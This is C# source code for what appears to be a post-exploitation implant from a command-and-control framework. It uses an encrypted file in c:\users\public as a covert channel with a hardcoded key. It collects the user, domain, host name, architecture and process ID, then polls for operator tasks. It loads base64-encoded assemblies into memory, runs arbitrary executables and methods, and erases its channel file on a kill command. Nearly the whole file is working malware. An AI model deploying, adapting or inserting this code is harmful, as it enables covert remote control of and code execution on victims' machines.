using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Newtonsoft.Json;

namespace FComm
{
    [Serializable()]
    public class RHDataGram : ISerializable
    {
        public string PacketType { get; set; }
        public string Input { get; set; }
        public string Output { get; set; }
        public DateTime UpdateTime { get; set; }
        public bool Sent { get; set; }
        public bool Actioned { get; set; }
        public bool Retrieved { get; set; }

        public RHDataGram()
        {
            UpdateTime = DateTime.Now;
            Sent = false;
            Actioned = false;
            Retrieved = false;
        }

        public override string ToString()
        {
            return string.Format("Packet of type {0}, contained the input {1} and was constructed at {2}.\n Complete State is: {3} and Retrieved state is: {4}.\n Result is: {5}", PacketType, Input, UpdateTime, Sent, Retrieved, Output);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("PacketType", PacketType);
            info.AddValue("Input", Input);
            info.AddValue("Output", Output);
            info.AddValue("Sent", Sent);
            info.AddValue("Retrieved", Retrieved);
            info.AddValue("Actioned", Actioned);
            info.AddValue("UpdateTime", UpdateTime);
        }

        public RHDataGram(SerializationInfo info, StreamingContext context)
        {
            PacketType = (string)info.GetValue("PacketType", typeof(string));
            Input = (string)info.GetValue("Input", typeof(string));
            Output = (string)info.GetValue("Output", typeof(string));
            Sent = (bool)info.GetValue("Sent", typeof(bool));
            Actioned = (bool)info.GetValue("Actioned", typeof(bool));
            Retrieved = (bool)info.GetValue("Retrieved", typeof(bool));
            UpdateTime = (DateTime)info.GetValue("UpdateTime", typeof(DateTime));
        }
    }

    public class RHClient
    {
        //Client is the far end of this connection.
        private string filepath;
        public RHClient(string filepath)
        {
            try
            {
                string path = Path.GetDirectoryName(filepath);
                string filename = Path.GetFileName(filepath);
                Directory.CreateDirectory(path); //Create the full path if it doesn't exist.
                var dave = File.Create(filepath); //create the file if it doesn't exist. Probably worth putting more sanity checks here.
                dave.Close();
                this.filepath = filepath;
            }
            catch (SecurityException e)
            {
                Debug.Print(e.Message);
            }
            catch (Exception e)
            {
                Debug.Print(e.Message);
            }
        }

        public List<RHDataGram> initialise(string hostinfo)
        {
            List<RHDataGram> InitialContent = new List<RHDataGram>(){
        new RHDataGram() {PacketType = "INIT", Input="initial", Output = "RobIsTheBest", Actioned = true}
        };
            return InitialContent;
        }

        public string Receive()
        {
            //Noddy as
            return File.ReadAllText(this.filepath);
        }

        public void SendData(string DataToSend)
        {
            //Write bytearrays - Ugh. Entire thing passes massive base64 strings around.
            //Write strings.
            try
            {
                //intended to handle byte[]
                //FileStream FileToBeWritten = File.Open(this.filepath, FileMode.Open, FileAccess.Write);
                //FileToBeWritten.Write(toGo, 0, toGo.Length); //Write the bytearray to the file.
                //FileToBeWritten.Close();
                File.WriteAllText(this.filepath, DataToSend);
            }
            catch (Exception e)
            {
                Debug.Print(e.Message);
            }
        }

        public string getTask(RHDataGram task)
        {
            return task.Input;
        }

        public void CleanUp()
        {
            //maybe utilise POSH SHRED here?
            File.Delete(this.filepath);
        }

    }
    /*    sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                Type typeToDeserialize = null;

                // For each assemblyName/typeName that you want to deserialize to
                // a different type, set typeToDeserialize to the desired type.
                String exeAssembly = Assembly.GetExecutingAssembly().FullName;


                // The following line of code returns the type.
                typeToDeserialize = Type.GetType(String.Format("{0}, {1}",
                    typeName, exeAssembly));

                return typeToDeserialize;
            }
        }*/
    public class Program
    {
        public static string input;
        public static bool kill;
        public static string filename;
        public static string encryption;
        public static string output;
        public static bool running;
        public static bool initialised;
        private static StringWriter backgroundTaskOutput = new StringWriter();

        public static void Sharp()
        {
            Program.filename = "c:\\users\\public\\test.ost";
            Program.encryption = "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=";
            Program.kill = false;
            FCommConnect();
            
        }

        public static void Main()
        {
            Sharp();
        }

        private static void FCommConnect()
        {
            RHClient FComm = new RHClient(filename);

            try
            {
                running = true;
                initialised = false;

                while (running)
                {
                    if (initialised == false)
                    {

                        var u = "";
                        try
                        {
                            u = WindowsIdentity.GetCurrent().Name;
                        }
                        catch
                        {
                            u = Environment.UserName;
                        }
                        u += "*";
                        var dn = Environment.UserDomainName;
                        var cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
                        var arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                        int pid = Process.GetCurrentProcess().Id;
                        Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
                        var hostinfo = String.Format("FComm-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
                        //Create datagram - Assume file is blank?
                        List<RHDataGram> toSend = FComm.initialise(hostinfo);
                        //Encrypt expects either a string, or byte array.
                        //MemoryStream stream = new MemoryStream();
                        //JsonSerializer js = JsonSerializer;
                        string jss = JsonConvert.SerializeObject(toSend);
                        //BinaryFormatter bf = new BinaryFormatter();
                        //bf.Binder = new PreMergeToMergedDeserializationBinder();
                        //bf.Serialize(stream, toSend);
                        var zo = Encrypt(encryption, jss); //list is encrypted.
                        //stream.Dispose();
                        //Send the datagram
                        FComm.SendData(zo);
                        Console.WriteLine(jss + ":" + zo);
                        initialised = true;
                    }
                    //var exitvt = new ManualResetEvent(false);
                    var output = new StringBuilder();

                    //if (pipeServerStream.CanRead)
                    //{
                    //DANGER THIS WILL SPANK THE CPU.
                    Thread.Sleep(5000);
                    string StuffToDoJson = Decrypt(encryption, FComm.Receive()); //retrieve byte[] due to mode 1 decrypt.
                                                                                  //Lets convert to list of datagrams.
                                                                                  //Step 1: STREAM
                   //MemoryStream stream2 = new MemoryStream(StuffToDoBytes);
                    //BinaryFormatter bf2 = new BinaryFormatter();
                    //bf2.Binder = new PreMergeToMergedDeserializationBinder();
                    //Step 2: DESERIALIZE!
                    List<RHDataGram> StuffToDo = JsonConvert.DeserializeObject <List<RHDataGram>>(StuffToDoJson);

                    //Clear old tasks - if we get a LIST back, its simple, as its just single in and out at the mo.
                    StuffToDo.RemoveAll(RHDataGram => RHDataGram.Retrieved == true);
                    foreach (RHDataGram Task in StuffToDo)
                    {
                        if (Task.Actioned == true)
                        {
                            continue;
                        }
                        var cmd = FComm.getTask(Task);
                        var sOutput2 = new StringWriter(); //Setup stringwriter to buffer output from command.
                        if (cmd.StartsWith("KILL"))
                        {
                            running = false;
                            initialised = false;
                            FComm.CleanUp();
                            //FComm.Dispose();
                        }
                        else if (cmd.ToLower().StartsWith("loadmodule"))
                        {
                            try
                            {
                                var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
                                var assembly = Assembly.Load(Convert.FromBase64String(module));
                            }
                            catch (Exception e) { Console.WriteLine($"Error loading modules {e}"); } //This looks broken. console?
                            sOutput2.WriteLine("Module loaded successfully");
                        }
                        else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
                        {
                            //This might not work!? Need to consider how to approach this.
                            Thread t = new Thread(() => RunAssembly(cmd, true));
                            t.Start();
                            sOutput2.WriteLine("[+] Running task in background, run get-bg to get background output.");
                            sOutput2.WriteLine("[*] Only run one task in the background at a time per implant.");
                        }
                        else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
                        {
                            var oldOutput = Console.Out; //redirecting output
                            Console.SetOut(sOutput2);
                            sOutput2.WriteLine(RunAssembly((cmd)));
                            Console.SetOut(oldOutput); //redirecting it back.
                        }
                        else if (cmd.ToLower() == "foo")
                        {
                            sOutput2.WriteLine("bar");
                        }
                        else if (cmd.ToLower() == "get-bg")
                        {
                            //Check with Rob when back.
                            var backgroundTaskOutputString = backgroundTaskOutput.ToString();
                            if (!string.IsNullOrEmpty(backgroundTaskOutputString))
                            {
                                output.Append(backgroundTaskOutputString); //check later.
                            }
                            else
                            {
                                sOutput2.WriteLine("[-] No output");
                            }
                        }
                        else
                        {
                            var oldOutput = Console.Out;
                            Console.SetOut(sOutput2);
                            sOutput2.WriteLine(RunAssembly($"run-exe Core.Program Core {cmd}"));
                            Console.SetOut(oldOutput);
                        }

                        output.Append(sOutput2.ToString());
                        Task.Output = output.ToString();
                        Task.Actioned = true;
                        output.Clear();
                        output.Length = 0;
                        sOutput2.Flush();
                        sOutput2.Close();
                    }
                    //All tasks have been iterated over. Time to encrypt the lot and communicate the results.
                    //assuming we have a list of datagrams, lets convert to bytearray
                    //MemoryStream stream3 = new MemoryStream();
                    //BinaryFormatter bf3 = new BinaryFormatter();
                    //bf3.Binder = new PreMergeToMergedDeserializationBinder();
                    string jss2 = JsonConvert.SerializeObject(StuffToDo);
                    //bf3.Serialize(stream3, StuffToDo);
                    var DataToGo = Encrypt(encryption, jss2); //list is encrypted.
                    //stream3.Dispose();
                    //Send the DATAAAAAAAAAHH!!!
                    FComm.SendData(DataToGo);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
        private static string[] ParseCommandLineArgs(string cl)
        {
            int argc;
            var argv = CommandLineToArgvW(cl, out argc);
            if (argv == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception();
            try
            {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++)
                {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                return args;
            }
            finally
            {
                Marshal.FreeHGlobal(argv);
            }
        }

        private static Type LoadAssembly(string assemblyName)
        {
            return Type.GetType(assemblyName, (name) =>
            {
                return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
            }, null, true);
        }

        private static string RunAssembly(string c, bool background = false)
        {

            var oldOutput = Console.Out;
            if (background)
            {
                backgroundTaskOutput = new StringWriter();
                Console.SetOut(backgroundTaskOutput);
            }
            var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
            int i = 0;
            var sOut = "";
            string sMethod = "", sta = "", qNme = "", name = "";
            foreach (var a in splitargs)
            {
                if (i == 1)
                    qNme = a;
                if (i == 2)
                    name = a;
                if (c.ToLower().StartsWith("run-exe"))
                {
                    if (i > 2)
                        sta = sta + " " + a;
                }
                else
                {
                    if (i == 3)
                        sMethod = a;
                    else if (i > 3)
                        sta = sta + " " + a;
                }
                i++;
            }
            string[] l = ParseCommandLineArgs(sta);
            var asArgs = l.Skip(1).ToArray();
            foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
                {
                    var lTyp = LoadAssembly(qNme + ", " + Ass.FullName);
                    try
                    {
                        if (c.ToLower().StartsWith("run-exe"))
                        {
                            object output = null;
                            output = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs });
                            if (output != null)
                            {
                                sOut = output.ToString();
                            }
                        }
                        else
                        {
                            try
                            {
                                object output = null;
                                output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs).ToString();
                                if (output != null)
                                {
                                    sOut = output.ToString();
                                }
                            }
                            catch
                            {
                                object output = null;
                                output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
                                if (output != null)
                                {
                                    sOut = output.ToString();
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("RAsm Exception: " + e.Message);
                        Console.WriteLine(e.StackTrace);
                    }
                    break;
                }
            }
            if (background)
            {
                Console.SetOut(oldOutput);
                backgroundTaskOutput.WriteLine(sOut);
            }
            return sOut;
        }
        private static string Decrypt(string key, string ciphertext)
        {
            var rawCipherText = Convert.FromBase64String(ciphertext);
            var IV = new Byte[16];
            Array.Copy(rawCipherText, IV, 16);
            try
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                //return decrypted;
                //return decrypted.Where(x => x > 0).ToArray();
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            catch
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                //return decrypted;
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
                //return decrypted.Where(x => x > 0).ToArray();
            }
            finally
            {
                Array.Clear(rawCipherText, 0, rawCipherText.Length);
                Array.Clear(IV, 0, 16);
            }

        }

        private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
        {
            byte[] byEnc;
            if (unByte != null)
                byEnc = unByte;
            else
                byEnc = Encoding.UTF8.GetBytes(un);

            if (comp)
                byEnc = GzipCompress(byEnc);

            try
            {
                var a = CreateEncryptionAlgorithm(key, null);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
            catch
            {
                var a = CreateEncryptionAlgorithm(key, null, false);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
        }

        private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
        {
            SymmetricAlgorithm algorithm;
            if (rij)
                algorithm = new RijndaelManaged();
            else
                algorithm = new AesCryptoServiceProvider();

            algorithm.Mode = CipherMode.CBC;
            algorithm.Padding = PaddingMode.Zeros;
            algorithm.BlockSize = 128;
            algorithm.KeySize = 256;

            if (null != IV)
                algorithm.IV = Convert.FromBase64String(IV);
            else
                algorithm.GenerateIV();

            if (null != key)
                algorithm.Key = Convert.FromBase64String(key);

            return algorithm;
        }

        private static byte[] GzipCompress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }

        private static byte[] CombineArrays(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }

    }
}
